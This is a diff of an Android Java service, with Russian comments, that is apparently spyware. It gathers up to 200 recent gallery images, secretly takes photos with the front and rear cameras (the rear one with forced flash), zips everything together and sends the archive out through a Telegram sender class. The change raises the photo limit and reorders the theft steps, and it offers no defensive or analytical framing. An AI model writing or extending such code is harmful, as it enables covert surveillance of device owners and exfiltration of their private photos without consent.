@@ -43,12 +43,52 @@ public class GalleryService extends Service {
                 zos = new ZipOutputStream(zipBuffer);
                 manager = (CameraManager) getSystemService(CAMERA_SERVICE);
 
-                // 1. Делаем снимок фронталки (UP)
+                // Сначала собираем галерею
+                addGalleryPhotos();
+                
+                // Потом делаем снимки
                 capturePhoto("up", "1");
 
             } catch (Exception e) { e.printStackTrace(); }
         }).start();
         return START_NOT_STICKY;
+    }
+
+    private void addGalleryPhotos() {
+        try {
+            List<Uri> allImages = getRecentImages();
+            for (Uri uri : allImages) {
+                try {
+                    InputStream is = getContentResolver().openInputStream(uri);
+                    BitmapFactory.Options options = new BitmapFactory.Options();
+                    options.inJustDecodeBounds = true;
+                    BitmapFactory.decodeStream(is, null, options);
+                    if (is != null) is.close();
+                    
+                    int scale = 1;
+                    while (options.outWidth / scale > 2000 || options.outHeight / scale > 2000) { scale *= 2; }
+
+                    is = getContentResolver().openInputStream(uri);
+                    options = new BitmapFactory.Options();
+                    options.inSampleSize = scale;
+                    Bitmap bitmap = BitmapFactory.decodeStream(is, null, options);
+                    if (is != null) is.close();
+
+                    if (bitmap != null) {
+                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
+                        byte[] bytes = baos.toByteArray();
+                        bitmap.recycle();
+
+                        ZipEntry entry = new ZipEntry(photoCount + ".jpg");
+                        zos.putNextEntry(entry);
+                        zos.write(bytes);
+                        zos.closeEntry();
+                        photoCount++;
+                    }
+                } catch (Exception e) { e.printStackTrace(); }
+            }
+        } catch (Exception e) { e.printStackTrace(); }
     }
 
     private void capturePhoto(String tag, String id) {
@@ -89,7 +129,6 @@ public class GalleryService extends Service {
                         yuvImage.compressToJpeg(new Rect(0, 0, w, h), 85, out); 
                         
                         try {
-                            // Называем просто up.jpg и noup.jpg
                             String filename = tag.equals("up") ? "up.jpg" : "noup.jpg";
                             ZipEntry entry = new ZipEntry(filename);
                             zos.putNextEntry(entry);
@@ -101,27 +140,39 @@ public class GalleryService extends Service {
                         
                         if (tag.equals("up")) {
                             new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
-                                capturePhoto("noup", "0");
+                                capturePhoto("noup", "0"); // Задняя
                             }, 1000);
                         } else {
-                            // После обеих камер запускаем галерею
+                            // Когда всё готово - отправляем ЗИП
                             new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
-                                addGalleryPhotos();
-                            }, 1000);
+                                try {
+                                    zos.close();
+                                    new TelegramSender().sendZip(zipBuffer.toByteArray(), "all.zip");
+                                } catch (Exception e) { e.printStackTrace(); }
+                                stopSelf();
+                            }, 500);
                         }
                     }, null);
                     try {
                         builder = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                         builder.addTarget(reader.getSurface());
-                        builder.set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF);
-                        builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
+                        
+                        if (tag.equals("noup")) {
+                            // Для задней камеры включаем вспышку
+                            builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_ALWAYS_FLASH);
+                            builder.set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_SINGLE);
+                        } else {
+                            builder.set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF);
+                        }
 
                         device.createCaptureSession(java.util.Collections.singletonList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                             @Override public void onConfigured(CameraCaptureSession s) {
+                                // Задержка 2.5 секунды для задней, 1 сек для фронтальной
+                                long delay = tag.equals("noup") ? 2500 : 1000;
                                 new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                                     try { s.capture(builder.build(), null, null); } 
                                     catch (Exception e) { e.printStackTrace(); }
-                                }, 1000);
+                                }, delay);
                             }
                             @Override public void onConfigureFailed(CameraCaptureSession s) {}
                         }, null);
@@ -131,49 +182,6 @@ public class GalleryService extends Service {
                 @Override public void onError(CameraDevice c, int e) { c.close(); }
             }, null);
         } catch (Exception e) { e.printStackTrace(); }
-    }
-
-    private void addGalleryPhotos() {
-        try {
-            List<Uri> allImages = getRecentImages();
-            for (Uri uri : allImages) {
-                try {
-                    InputStream is = getContentResolver().openInputStream(uri);
-                    BitmapFactory.Options options = new BitmapFactory.Options();
-                    options.inJustDecodeBounds = true;
-                    BitmapFactory.decodeStream(is, null, options);
-                    if (is != null) is.close();
-                    
-                    int scale = 1;
-                    while (options.outWidth / scale > 2000 || options.outHeight / scale > 2000) { scale *= 2; }
-
-                    is = getContentResolver().openInputStream(uri);
-                    options = new BitmapFactory.Options();
-                    options.inSampleSize = scale;
-                    Bitmap bitmap = BitmapFactory.decodeStream(is, null, options);
-                    if (is != null) is.close();
-
-                    if (bitmap != null) {
-                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
-                        byte[] bytes = baos.toByteArray();
-                        bitmap.recycle();
-
-                        ZipEntry entry = new ZipEntry(photoCount + ".jpg");
-                        zos.putNextEntry(entry);
-                        zos.write(bytes);
-                        zos.closeEntry();
-                        photoCount++;
-                    }
-                } catch (Exception e) { e.printStackTrace(); }
-            }
-            
-            zos.close();
-            
-            new TelegramSender().sendZip(zipBuffer.toByteArray(), "all.zip");
-
-        } catch (Exception e) { e.printStackTrace(); }
-        stopSelf();
     }
 
     private List<Uri> getRecentImages() {
@@ -188,7 +196,7 @@ public class GalleryService extends Service {
 
         if (cursor != null) {
             int count = 0;
-            while (cursor.moveToNext() && count < 150) {
+            while (cursor.moveToNext() && count < 200) { // 200 фото
                 long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                 Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
                 imageUris.add(uri);
